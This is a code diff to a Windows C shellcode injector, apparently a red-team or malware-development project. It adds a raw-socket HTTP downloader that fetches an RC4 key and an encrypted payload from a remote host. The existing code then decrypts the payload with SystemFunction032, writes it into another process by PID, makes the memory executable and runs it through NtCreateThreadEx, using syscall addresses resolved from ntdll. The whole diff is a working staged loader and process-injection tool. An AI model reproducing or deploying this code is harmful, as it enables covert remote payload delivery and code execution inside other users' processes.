@@ -1,8 +1,16 @@
+#include <winsock2.h>
+#include <ws2tcpip.h>
 #include <Windows.h>
 #include <stdio.h>
+#include <string.h>
 #include "define.h"
 
-#define pid 20788
+#pragma comment(lib, "Ws2_32.lib")
+
+#define pid 13400
+
+size_t szCalc;
+size_t szKey;
 
 SystemFunction032 jodRC4;
 
@@ -82,7 +90,6 @@ QWORD GetSyscallAdr(HMODULE hNTDLL, char* Procedure) {
 	return SyscallAddr;
 }
 
-
 void Populate() {
 	HANDLE hNtdll = GetModuleHandleW(L"ntdll");
 
@@ -103,32 +110,168 @@ void Populate() {
 	jodRC4 = (SystemFunction032)GetProcAddress(LoadLibraryA("advapi32"), "SystemFunction032");
 }
 
+struct Memory {
+	char* data;
+	size_t size;
+};
+
+struct Memory rc4Key, cipher;
+
+int DownloadHttpToMemory(const char* host, char* port, const char* path, struct Memory* outMem) {
+	WSADATA wsa;
+	SOCKET sock = INVALID_SOCKET;
+	struct addrinfo hints, * res = NULL;
+	char sendbuf[1024];
+	char recvbuf[4096];
+	int bytes;
+
+	char newHost[100] = "";
+	strcat_s(newHost, 100, host);
+	strcat_s(newHost, 100, ":");
+	strcat_s(newHost, 100, port);
+
+	outMem->data = NULL;
+	outMem->size = 0;
+
+	// Winsock startup
+	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
+		fprintf(stderr, "WSAStartup failed.\n");
+		return 0;
+	}
+
+	memset(&hints, 0, sizeof(hints));
+	hints.ai_family = AF_INET;
+	hints.ai_socktype = SOCK_STREAM;
+	
+
+#ifdef _DEBUG
+	printf("[DEBUG] Resolving %s...\n", host);
+#endif
+	if (getaddrinfo(host, port, &hints, &res) != 0) {
+		fprintf(stderr, "getaddrinfo failed.\n");
+		WSACleanup();
+		return 0;
+	}
+#ifdef _DEBUG
+	printf("[DEBUG] Connecting to %s...\n", host);
+#endif
+	sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
+	if (sock == INVALID_SOCKET) {
+		fprintf(stderr, "socket() failed.\n");
+		freeaddrinfo(res);
+		WSACleanup();
+		return 0;
+	}
+
+	if (connect(sock, res->ai_addr, (int)res->ai_addrlen) == SOCKET_ERROR) {
+		fprintf(stderr, "connect() failed.\n");
+		closesocket(sock);
+		freeaddrinfo(res);
+		WSACleanup();
+		return 0;
+	}
+	freeaddrinfo(res);
+	snprintf(sendbuf, sizeof(sendbuf),
+		"GET %s HTTP/1.0\r\n"
+		"Host: %s\r\n"
+		"User-Agent: RawHTTPClient/1.0\r\n"
+		"Connection: close\r\n\r\n", path, host);
+#ifdef _DEBUG
+	printf("[DEBUG] Sending request:\n%s\n", sendbuf);
+#endif
+	send(sock, sendbuf, (int)strlen(sendbuf), 0);
+
+#ifdef _DEBUG
+	printf("[DEBUG] Reading response...\n");
+#endif
+	while ((bytes = recv(sock, recvbuf, sizeof(recvbuf), 0)) > 0) {
+		char* tmp = realloc(outMem->data, outMem->size + bytes + 1);
+		if (!tmp) {
+			fprintf(stderr, "Out of memory.\n");
+			closesocket(sock);
+			WSACleanup();
+			return 0;
+		}
+		outMem->data = tmp;
+		memcpy(outMem->data + outMem->size, recvbuf, bytes);
+		outMem->size += bytes;
+	}
+
+	closesocket(sock);
+	WSACleanup();
+
+	if (!outMem->data) {
+		fprintf(stderr, "[!] No data received.\n");
+		return 0;
+	}
+
+	outMem->data[outMem->size] = '\0'; // null terminate
+#ifdef _DEBUG
+	printf("[DEBUG] Total received: %zu bytes\n", outMem->size);
+#endif
+	// Remove headers
+	char* bodyStart = strstr(outMem->data, "\r\n\r\n");
+	if (bodyStart) {
+		size_t headerLen = (bodyStart + 4) - outMem->data;
+		size_t bodySize = outMem->size - headerLen;
+		memmove(outMem->data, bodyStart + 4, bodySize);
+		outMem->size = bodySize;
+		outMem->data[outMem->size] = '\0';
+	}
+	else {
+		fprintf(stderr, "[???] No HTTP header found.\n");
+	}
+
+	return 1;
+}
+
+void PopulateData(char* host, char* port, char* LocKey, char* LocCipher) {
+	char URL[50] = "/";
+	strcat_s(URL, 50, LocKey);
+	printf("Key Location: http://%s%s", host,URL);
+
+	char cURL[50] = "/";
+	strcat_s(cURL, 50, LocCipher);
+	printf("\nCipher Location: http://%s%s", host,cURL);
+
+	DownloadHttpToMemory(host,port, URL, &rc4Key);
+	DownloadHttpToMemory(host,port, cURL, &cipher);
+	szCalc = cipher.size;
+	szKey = rc4Key.size;
+}
+
 int main(int argc, char* argv[]) {
 	int PID = 0;
+	char *host;
+	char* port;
+	char *LocKey;
+	char *LocCipher;
 
-	if (argc < 2) {
+
+	if (argc < 5) {
 #if _DEBUG
 		ok("Will have to pull from code ugh");
+		char* host = "127.0.0.1";
+		char* port = "8080";
+		char LocKey[] = "key.bin";
+		char LocCipher[] = "cipher.bin";
 		PID = pid;
+		PopulateData(host, port, LocKey, LocCipher);
 		Populate();
 #else
-		error("Provide the PID of the process to inject calc into\n%s <PID>", argv[0]);
+		error("Provide the PID of the process to inject calc into, the host, the key and the cipher \n%s <PID> <HOST> <key.bin> <cipher.bin>", argv[0]);
 		return 1;
 #endif
 	}
 	else {
 		PID = atoi(argv[1]);
+		host = argv[2];
+		port = argv[3];
+		LocKey = argv[4];
+		LocCipher = argv[5];
+		PopulateData(host,port, LocKey, LocCipher);
 		Populate();
 	}
-
-	/*HANDLE hNTDLL = GetModuleHandleW(L"NTDLL");
-	if (hNTDLL == NULL) {
-		error("Couldn't get handle to ntdll.dll");
-		yolo();
-	}
-	else {
-		ok("Got the Handle to NTDLL --> 0x%p", hNTDLL);
-	}*/
 
 	OBJECT_ATTRIBUTES oa = { sizeof(oa),NULL };
 	CLIENTID cid = { NULL };
@@ -143,9 +286,6 @@ int main(int argc, char* argv[]) {
 	else {
 		ok("Got the handle to the process --> 0x%p", hProcess);
 	}
-#if _DEBUG
-	//getch();
-#endif
 
 	size_t sz = 128;
 	LPVOID rBuffer = NULL;
@@ -158,28 +298,11 @@ int main(int argc, char* argv[]) {
 		ok("Memory Allocated at 0x%p", &rBuffer);
 	}
 
-#if _DEBUG
-	//getch();
-#endif
-
-#if _FALSE //Why did I even write this..
-	info("Populating the jodProtect API");
-
-	ULONG old;
-	ntError = NtProtectVirtualMemory(hProcess, &rBuffer, szCalc, (MEM_RESERVE | MEM_COMMIT), &old);
-	if (ntError != STATUS_SUCCESS) {
-		error("Could not change memory protections");
-		yolo();
-	}
-	else {
-		ok("Memory Protections changed");
-	}
-#endif
-	ustring Key = { (DWORD)szRc4Key, (DWORD)szRc4Key, rc4Key };
-	ustring shellBuff = { (DWORD)szCalc,(DWORD)szCalc, calc };
+	ustring Key = { (DWORD)szKey, (DWORD)szKey, rc4Key.data };
+	ustring shellBuff = { (DWORD)szCalc,(DWORD)szCalc, cipher.data };
 	jodRC4(&shellBuff, &Key);
 
-	ntError = NtWriteVirtualMemory(hProcess, rBuffer, (PVOID)calc, szCalc, 0);
+	ntError = NtWriteVirtualMemory(hProcess, rBuffer, (PVOID)cipher.data, szCalc, 0);
 	if (ntError != STATUS_SUCCESS) {
 		error("Could not write shellcode to process memory");
 		yolo();
@@ -188,11 +311,6 @@ int main(int argc, char* argv[]) {
 		ok("Wrote shellcode to memory");
 		jodRC4(&shellBuff, &Key);
 	}
-#if _DEBUG
-	//getch();
-#endif
-
-
 
 	ULONG old;
 	ntError = NtProtectVirtualMemory(hProcess, &rBuffer, &szCalc, PAGE_EXECUTE_READ, &old);
@@ -203,9 +321,6 @@ int main(int argc, char* argv[]) {
 	else {
 		ok("Memory Protections changed");
 	}
-#if _DEBUG
-	//getch();
-#endif
 
 	HANDLE tHandle = NULL;
 	ntError = NtCreateThreadEx(&tHandle, THREAD_ALL_ACCESS, &oa, hProcess, rBuffer, NULL, 0, 0, 0, 0, NULL);
@@ -216,7 +331,6 @@ int main(int argc, char* argv[]) {
 	else {
 		ok("Thread Started");
 	}
-
 
 	info("Closing all handles");
 	NtClose(hProcess);
